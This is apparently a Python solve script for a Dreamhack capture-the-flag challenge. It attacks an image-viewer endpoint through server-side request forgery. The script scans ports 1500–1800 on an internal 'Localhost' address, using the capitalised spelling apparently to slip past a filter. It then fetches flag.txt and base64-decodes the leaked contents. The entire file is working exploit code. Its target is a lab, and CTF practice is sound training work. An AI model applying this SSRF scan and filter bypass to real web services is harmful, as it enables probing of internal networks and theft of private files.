import requests
import base64
from tqdm import tqdm

url = 'http://host3.dreamhack.games:12312/img_viewer'
ERROR = 'iVBORw0K'

def find_port():
    for port in tqdm(range(1500, 1801)):

        data = {
            'url' : f'http://Localhost:{port}'
        }
        r = requests.post(url, data = data)

        if ERROR not in r.text:
            print(f'[*] PORT == {port}')
            return port

def find_flag(port):
    data = {
        'url' : f'http://Localhost:{port}/flag.txt'
    }
    r = requests.post(url, data = data)
    first_idx = r.text.find('<img src="data:image/png;base64, ') + len('<img src="data:image/png;base64, ')
    end_idx = r.text.find('"', first_idx) + 1
    flag = base64.b64decode(r.text[first_idx:end_idx]).decode('utf-8')
    print(f'[*] FLAG = {flag}')

if __name__ == '__main__':
    port = find_port()
    find_flag(port)